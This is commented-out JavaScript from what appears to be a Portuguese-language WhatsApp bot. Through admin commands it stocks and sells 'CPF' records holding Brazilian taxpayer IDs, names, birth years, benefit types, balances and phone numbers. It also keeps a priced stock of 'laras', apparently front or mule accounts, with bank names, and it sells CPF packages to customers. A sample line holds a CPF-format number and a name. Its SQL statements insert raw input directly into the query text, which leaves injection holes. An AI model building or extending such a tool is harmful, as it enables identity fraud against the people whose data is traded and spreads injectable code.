        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 












        //addcpf===CPF===NOME===ANO_NASC===TIPO===SALDO===NOME_CELULAR===NUMERO_CELULAR===CADASTRADO 1 OU 0
        //addcpf===43487483904===Elisa===26===Seguro Desemprego===2000===🟩1SIM1===12345678===1
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/addcpwerwerf===") > -1 && Adms.includes(Numero)) {

        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }

        //             Array_Fila_Espera = []
        //             try {
        //                 await client.sendText(Mensagem_From, "ABASTECENDO CPF...").then(async (result) => {

        //                     try {
        //                         Contagem_Abastecidas = 0

        //                         db = new sqlite3.Database(Diretorio_SQLITE_Principal);
        //                         db.serialize(async function () {
        //                             db.run("begin transaction");

        //                             try {

        //                                 Abastecendo = true

        //                                 Div = Mensagem_Texto.split("===")

        //                                 CPF = Div[1].toUpperCase()
        //                                 console.log(`Inserindo CPF: ${CPF}`)
        //                                 NOME = Div[2]
        //                                 ANO_NASC = Div[3]
        //                                 TIPO = Div[4].toUpperCase()
        //                                 SALDO = Div[5]
        //                                 NOME_CELULAR = Div[6]
        //                                 NUMERO_CELULAR = Div[7]
        //                                 QUATRO_DIGITOS = NUMERO_CELULAR.substr(NUMERO_CELULAR.length - 4);
        //                                 CADASTRADO = Div[8]
        //                                 DATA_MS_INSERIDO = Date.now()

        //                                 db.run(`INSERT INTO CPF (CPF,NOME,ANO_NASC,TIPO,SALDO,NOME_CELULAR,NUMERO_CELULAR,QUATRO_DIGITOS,CADASTRADO,DATA_MS_INSERIDO) VALUES ('${CPF}','${NOME}','${ANO_NASC}','${TIPO}','${SALDO}','${NOME_CELULAR}','${NUMERO_CELULAR}','${QUATRO_DIGITOS}','${CADASTRADO}','${DATA_MS_INSERIDO}') ON CONFLICT DO NOTHING`);
        //                                 Contagem_Abastecidas = parseInt(Contagem_Abastecidas) + 1

        //                             } catch (error) {
        //                                 console.log(error)

        //                                 for await (adm of Adms) {
        //                                     Texto = `*Ocorreu algum problema no abastecimento.*

        // Erro: ${error}`
        //                                     await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                         Abastecendo = false
        //                                         return
        //                                     }).catch(async(erro) => {
        //                                         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                     });
        //                                 }
        //                                 return
        //                             }

        //                             if (Contagem_Abastecidas != 0) {
        //                                 console.log("comitando")
        //                                 db.run("commit");
        //                             }

        //                             for await (adm of Adms) {
        //                                 Texto = `*ABASTECIMENTO FINALIZADO*

        // CPF: ${CPF} Abastecido.
        // `, `${adm}@c.us`
        //                                 await client.sendText(`${adm}@c.us`, Texto).then(async (result) => {
        //                                 }).catch(async(erro) => {
        //                                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                                 });
        //                             }
        //                             Abastecendo = false
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         });
        //                     } catch (error) {
        //                         Texto = `Erro === ${error}`
        //                         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                         }).catch(async(erro) => {
        //                             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                         });
        //                     }
        //                 })
        //                     .catch((error) => { console.log(debugLine("Error when sending = " + (JSON.stringify(error)))); });
        //             } catch (error) {
        //                 Texto = `Erro === ${error}`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/baixarestoquecpxcdcf") > -1 && Adms.includes(Numero)) {
        //     return
        //     lara
        //     Texto = `Gerando arquivo...`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {

        //         Array_MATERIAL = await DataBase_Better.prepare(`SELECT * FROM LARAS`).all();
        //         //shuffle(Array_MATERIAL);

        //         today = new Date();
        //         today.setHours(today.getHours() + 0);
        //         Nome_File_Visual = `${Nome_Dono} ${Array_MATERIAL.length} Laras Data ${today}.txt`
        //         Nome_File_Visual = Nome_File_Visual.replace(/\\/igm, '/');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\s\(Horário Padrão de Brasília\)/igm, '');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\sGMT\-0300/igm, '');
        //         Nome_File_Visual = Nome_File_Visual.replace(/\:/igm, ' ');

        //         Nome_File = __dirname + `\\Pacotes\\${Nome_File_Visual}`

        //         //console.log(Nome_File_Visual)
        //         //console.log(Nome_File)

        //         message = fs.createWriteStream(Nome_File);
        //         for (var index = 0; index < Array_MATERIAL.length; index++) {
        //             console.log(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["NOME"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}`)
        //             message.write(`${Array_MATERIAL[index]["BANCO"]}|${Array_MATERIAL[index]["NOME"]}|${Array_MATERIAL[index]["PRECO"]}|${Array_MATERIAL[index]["INFORMACOES_ADICIONAIS"]}\n`);
        //             if (index === parseInt(Array_MATERIAL.length) - 1) {
        //                 //console.log("Foi")
        //                 await delay(2000)
        //                 await client.sendFile(Mensagem_From, Nome_File, Nome_File_Visual, "Texto_Usuario").then(async (result) => {
        //                 }).catch(async(erro) => {
        //                     console.error('Error when sending: ', erro);
        //                 });
        //             }
        //         }
        //     }).catch(async(erro) => {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto === "/deletarestoquelarddafadfa" && Adms.includes(Numero)) {
        //     return
        //     await DataBase_Better.prepare(`DELETE FROM LARAS`).run();
        //     Texto = `*ESTOQUE DE LARAS DELETADO COM SUCESSO!*`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //     }).catch(async(erro) => {
        //         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/textomenucpf===") > -1 && Adms.includes(Numero)) {
        //     try {
        //         msg = Mensagem_Texto.split("===")
        //         Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //         if (msg[1] === "") {
        //             Texto = `Comando inválido`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //         TEXTO_MENU_CPF = msg[1]
        //         TEXTO_MENU_CPF = TEXTO_MENU_CPF.replace(/\'/igm, "")
        //         await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${TEXTO_MENU_CPF}' WHERE PARAMETRO = 'TEXTO_MENU_CPF'`).run()

        //         Texto = `*TEXTO DO MENU DE CPF ALTERADO COM SUCESSO!*`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     } catch (error) {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //         Texto = `Comando inválido`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto.indexOf("/textocomproucpf===") > -1 && Adms.includes(Numero)) {
        //     try {
        //         msg = Mensagem_Texto.split("===")
        //         Array_Total_Igual = Mensagem_Texto.match(/\=/igm);

        //         if (msg[1] === "") {
        //             Texto = `Comando inválido`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //             });
        //             return
        //         }
        //         MENSAGEM_AO_COMPRAR_CPF = msg[1]
        //         MENSAGEM_AO_COMPRAR_CPF = MENSAGEM_AO_COMPRAR_CPF.replace(/\'/igm, "")
        //         await DataBase_Better.prepare(`UPDATE SISTEMA SET VALOR = '${MENSAGEM_AO_COMPRAR_CPF}' WHERE PARAMETRO = 'MENSAGEM_AO_COMPRAR_CPF'`).run()

        //         Texto = `*TEXTO A EXIBIR QUANDO CLIENTE COMPRAR CPF, ALTERADO COM SUCESSO!*`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     } catch (error) {
        //         console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`))
        //         Texto = `Comando inválido`
        //         await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //             Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //         }).catch(async(erro) => {
        //             console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //         });
        //         return
        //     }
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳


        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        // if (Mensagem_Texto === "/deletarlistacpfpacotes" && Adms.includes(Numero)) {
        //     Array_CCS = await DataBase_Better.prepare(`DELETE FROM PACOTES_CPF`).run();
        //     Texto = `Lista de PACOTES CPF deletada com sucesso!`
        //     await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //         Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //     }).catch(async(erro) => {
        //         console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //     });
        //     return
        // }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳

        //inserirpacotecpfextra===TIPO===CADASTRADO===DATA===QUANTIDADE===PRECO
        //inserirpacotecpfextra===EXTRAORDINARIO===1===20/04===10===100
        //#▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ 
        //         if (Mensagem_Texto.indexOf("/inserirpacotecpfextra===") > -1 && Adms.includes(Numero)) {
        //             Array_Total_Igual = Mensagem_Texto.match(/\=/igm);
        //             msg = Mensagem_Texto.split("===")

        //             if (msg[1] === "" || Array_Total_Igual.length != 15) {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[2] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             if (msg[3] === "") {
        //                 Texto = `Comando inválido`
        //                 await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                     Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //                 }).catch(async(erro) => {
        //                     console.log(debugLine("Error when sending = " + (JSON.stringify(error))));
        //                 });
        //                 return
        //             }
        //             TIPO = msg[1]
        //             CADASTRADO = msg[2]
        //             DATA = msg[3]
        //             QUANTIDADE = msg[4]
        //             VALOR = msg[5]
        //             VALOR = parseFloat(VALOR).toFixed(2);

        //             Texto = `*PACOTE CPFs EXTRAORDINÁRIO INSERIDO!*

        // TIPO = ${TIPO}
        // CADASTRADO = ${CADASTRADO}
        // DATA = ${DATA}
        // QUANTIDADE = ${QUANTIDADE}
        // VALOR = ${VALOR}`
        //             await client.sendText(Mensagem_From, Texto).then(async (result) => {
        //                 await DataBase_Better.prepare(`INSERT INTO PACOTES_CPF_EXTRAORDINARIO (TIPO,CADASTRADO,DATA,QUANTIDADE,VALOR) VALUES ('${TIPO}','${CADASTRADO}','${DATA}','${QUANTIDADE}','${VALOR}')`).run()
        //                 Item_Fila_Sendo_Processado = "0"; return; console.log(debugLine("FIM"));
        //             }).catch(async(erro) => {
        //                 console.log(debugLine(`Erro = ${JSON.stringify(error)} | ${error}`));
        //             });
        //             return
        //         }
        //#-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳-̳





        //addcpfextra===CPF===CADASTRADO===DATA
        //addcpfextra===12345678===1 ou 0===20/04 ou 30/04
